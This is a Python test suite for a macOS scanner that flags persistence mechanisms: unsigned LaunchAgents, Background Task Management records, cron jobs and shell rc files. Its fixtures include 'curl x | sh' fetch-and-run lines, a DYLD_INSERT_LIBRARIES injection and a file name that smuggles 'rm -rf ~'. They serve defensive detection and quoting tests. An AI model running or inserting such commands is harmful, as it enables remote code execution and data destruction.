import plistlib
import shlex
import unittest

from msec.checks import persistence
from tests.helpers import tmp_ctx

BTM = """
========================
 Records for UID -2 : FFFF
========================
 Items:
 #1:
                 Name: SystemThing
                 Type: app (0x2)
          Disposition: [enabled, allowed, notified] (0xb)
========================
 Records for UID 501 : 8E05
========================

 Items:

 #1:
                 UUID: 1
                 Name: Good App
       Developer Name: Good Corp
      Team Identifier: ABCDE12345
                 Type: app (0x2)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: com.good.app
                  URL: file:///Applications/Good.app/

 #2:
                 UUID: 2
                 Name: sneaky
       Developer Name: (null)
                 Type: background tasks (0x2000)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: sneaky.helper
      Executable Path: /Users/u/.local/sneaky

 #3:
                 Name: off
       Developer Name: (null)
                 Type: app (0x2)
          Disposition: [disabled, allowed, not notified] (0x2)
           Identifier: off.app

 #4:
                 Name: legacy
       Developer Name: (null)
                 Type: legacy agent (0x10008)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: legacy.agent
"""
SIGNED = (0, "", "Executable=/opt/x\nAuthority=Developer ID Application: Good (ABCDE12345)\nTeamIdentifier=ABCDE12345\n")
UNSIGNED = (1, "", "/Users/u/evil: code object is not signed at all\n")


def write_plist(ctx, name, program_args, **extra):
    d = ctx.home / "Library/LaunchAgents"
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(plistlib.dumps({"Label": name.removesuffix(".plist"), "ProgramArguments": program_args, **extra}))
    return p


def by_check(results, name):
    return next(r for r in results if r.check == name)


def sig(stderr):
    return tmp_ctx({"/usr/bin/codesign": (0, "", stderr)})


class SignerTest(unittest.TestCase):
    def test_not_set_is_unsigned_and_critical(self):
        ctx = sig("TeamIdentifier=not set\n")
        self.assertEqual(persistence.signer(ctx, "/opt/x"), "unsigned")
        write_plist(ctx, "a.plist", ["/opt/x"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "critical")

    def test_adhoc_is_critical(self):
        ctx = sig("Signature=adhoc\nTeamIdentifier=not set\n")
        self.assertEqual(persistence.signer(ctx, "/opt/x"), "adhoc")
        write_plist(ctx, "a.plist", ["/opt/x"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "critical")

    def test_apple_platform_binary(self):
        ctx = sig("Authority=macOS Software Signing\nAuthority=Apple Root CA\nTeamIdentifier=not set\n")
        self.assertEqual(persistence.signer(ctx, "/usr/bin/python3"), "apple")

    def test_developer_id_team_is_medium(self):
        ctx = sig("Authority=Developer ID Application: X (ABCDE12345)\nTeamIdentifier=ABCDE12345\n")
        self.assertEqual(persistence.signer(ctx, "/opt/x"), "ABCDE12345")
        write_plist(ctx, "a.plist", ["/opt/x"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "medium")


class PersistenceTest(unittest.TestCase):
    def test_script_launch_agent_is_critical(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED, "/usr/bin/sfltool": (0, "", ""), "/usr/bin/crontab": (1, "", "crontab: no crontab for u\n")})
        write_plist(ctx, "com.evil.plist", ["/bin/sh", "-c", "curl -s x | sh"])
        r = by_check(persistence.run(ctx), "persistence.launchd")
        f = r.findings[0]
        self.assertEqual(f.severity, "critical")
        self.assertIn("(script)", f.title)

    def test_signed_agent_is_medium_unsigned_is_critical(self):
        evil = "/Users/u/evil"
        ctx = tmp_ctx({("/usr/bin/codesign", "-dv", "--verbose=2", "/opt/x"): SIGNED,
                       ("/usr/bin/codesign", "-dv", "--verbose=2", evil): UNSIGNED})
        write_plist(ctx, "a.plist", ["/opt/x"])
        write_plist(ctx, "b.plist", [evil])
        sev = {f.key["program"]: f.severity for f in by_check(persistence.run(ctx), "persistence.launchd").findings}
        self.assertEqual(sev, {"/opt/x": "medium", evil: "critical"})

    def test_payload_change_changes_fingerprint(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "--one"])
        fp1 = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
        write_plist(ctx, "a.plist", ["/opt/x", "--two"])
        fp2 = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
        self.assertNotEqual(fp1, fp2)

    def test_plist_content_change_changes_fingerprint(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        fp = lambda: by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
        write_plist(ctx, "a.plist", ["/opt/x"])
        fp1 = fp()
        write_plist(ctx, "a.plist", ["/opt/x"], EnvironmentVariables={"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"})
        self.assertNotEqual(fp1, fp())

    def test_script_content_change_changes_fingerprint(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        script = ctx.home / "x.sh"
        script.write_text("echo ok\n")
        write_plist(ctx, "a.plist", ["/bin/bash", str(script)])
        f1 = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
        script.write_text("curl x | sh\n")
        f2 = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
        self.assertIn("script", f1.key)
        self.assertNotEqual(f1.fingerprint, f2.fingerprint)

    def test_signer_never_runs_codesign_on_relative_path(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        for prog in ("evil", "-x", ""):
            self.assertEqual(persistence.signer(ctx, prog), "unsigned")
        self.assertEqual(ctx.calls, [])

    def test_fix_command_quotes_hostile_file_names(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        p = write_plist(ctx, "x'; rm -rf ~; '.plist", ["/opt/x"])
        fix = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fix[0]
        self.assertEqual(shlex.split(fix)[-1], str(p))

    def test_unparseable_plist_is_reported_not_crashing(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        (d / "broken.plist").write_text("not a plist")
        f = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
        self.assertEqual((f.severity, f.key.get("unparseable")), ("medium", True))

    def test_parse_btm_only_own_uid(self):
        recs = persistence.parse_btm(BTM, 501)
        self.assertEqual([r.get("Identifier") for r in recs], ["com.good.app", "sneaky.helper", "off.app", "legacy.agent"])

    def test_btm_flags_enabled_unsigned_and_skips_disabled_and_legacy(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": (0, BTM, "")})
        r = by_check(persistence.run(ctx), "persistence.btm")
        sev = {f.key["identifier"]: f.severity for f in r.findings}
        self.assertEqual(sev, {"com.good.app": "medium", "sneaky.helper": "critical"})

    def test_btm_failure_is_not_scanned(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": "timeout"})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.btm").status, "not_scanned")

    def test_crontab(self):
        ctx = tmp_ctx({"/usr/bin/crontab": (1, "", "crontab: no crontab for u\n")})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.cron").status, "ok")
        ctx = tmp_ctx({"/usr/bin/crontab": (0, "# comment\n\n*/5 * * * * curl x|sh\n", "")})
        fs = by_check(persistence.run(ctx), "persistence.cron").findings
        self.assertEqual([f.severity for f in fs], ["critical"])

    def test_rc_change_changes_fingerprint(self):
        ctx = tmp_ctx()
        (ctx.home / ".zshrc").write_text("export A=1\n")
        fp1 = by_check(persistence.run(ctx), "persistence.rc").findings[0].fingerprint
        (ctx.home / ".zshrc").write_text("export A=1\ncurl x | sh\n")
        fp2 = by_check(persistence.run(ctx), "persistence.rc").findings[0].fingerprint
        self.assertNotEqual(fp1, fp2)

    def test_malformed_plist_shapes_are_unparseable(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        (d / "arr.plist").write_bytes(plistlib.dumps(["a", "b"]))
        (d / "int.plist").write_bytes(plistlib.dumps({"Label": "x", "ProgramArguments": 5}))
        write_plist(ctx, "ok.plist", ["/opt/x"])
        fs = by_check(persistence.run(ctx), "persistence.launchd").findings
        self.assertEqual(sorted(f.severity for f in fs), ["medium"] * 3)
        self.assertEqual(sum(1 for f in fs if f.key.get("unparseable")), 2)

    def test_denied_dir_is_partial_not_clean(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        d.chmod(0)
        self.addCleanup(d.chmod, 0o700)
        names = [r.check for r in persistence.run(ctx) if r.status == "not_scanned"]
        self.assertIn("persistence.launchd.partial", names)

    def test_interpreter_by_basename_and_dash_c(self):
        for prog in ("/opt/homebrew/bin/bash", "/usr/local/bin/python3.12", "/bin/ksh"):
            ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
            write_plist(ctx, "a.plist", [prog])
            f = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
            self.assertEqual(f.severity, "critical", prog)
            self.assertIn("(script)", f.title)
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "-c", "boom"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "critical")
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "--flag"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "medium")

    def test_btm_retries_once_after_transient_failure(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": ["timeout", (0, BTM, "")]})
        r = by_check(persistence.run(ctx), "persistence.btm")
        self.assertEqual(r.status, "findings")
        self.assertTrue(r.findings)

    def test_btm_failing_twice_reports_reason(self):
        r = by_check(persistence.run(tmp_ctx({"/usr/bin/sfltool": ["timeout"]})), "persistence.btm")
        self.assertEqual((r.status, r.reason), ("not_scanned", "sfltool dumpbtm timed out twice"))
        r = by_check(persistence.run(tmp_ctx({"/usr/bin/sfltool": [(1, "", ""), (2, "", "")]})), "persistence.btm")
        self.assertEqual(r.reason, "sfltool dumpbtm failed twice (rc=2)")

    def test_btm_without_our_section_is_not_scanned(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": (0, "", "")})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.btm").status, "not_scanned")


if __name__ == "__main__":
    unittest.main()
